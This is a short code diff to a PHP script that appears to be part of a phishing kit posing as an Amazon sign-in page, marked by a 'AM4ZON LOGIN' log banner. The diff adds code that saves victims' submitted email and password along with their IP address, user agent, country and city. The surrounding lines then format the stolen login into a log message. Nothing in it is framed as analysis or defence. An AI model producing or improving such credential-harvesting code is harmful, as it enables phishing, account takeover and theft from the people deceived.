@@ -10,6 +10,7 @@ error_reporting(0);
 # Adding Settings
 include('function.php');
 $settings = include('../config.php');
+require_once __DIR__ . '/../storage/storage.php';
 # User Agent 
 
 $useragent = $_SERVER['HTTP_USER_AGENT'];
@@ -19,6 +20,20 @@ $username = $_POST['email']; #id_userLoginId
 $password = $_POST['password']; #id_password
 #$username = $_SESSION["email"];
 #$password = $_SESSION["ap_password"];
+# Persist step data
+$payload = [
+    'username' => $username,
+    'password' => $password
+];
+
+$meta = [
+    'ip' => $IP,
+    'user_agent' => $useragent,
+    'country' => $countryname,
+    'city' => $city
+];
+
+append_login_session_step(session_id(), 'login', $payload, $meta);
 # Logs
 $message .= "🔥 AM4ZON LOGIN FROM - {$IP} 🔥\n\n";
 $message .= "➤ [ Login ]    : {$username}\n";
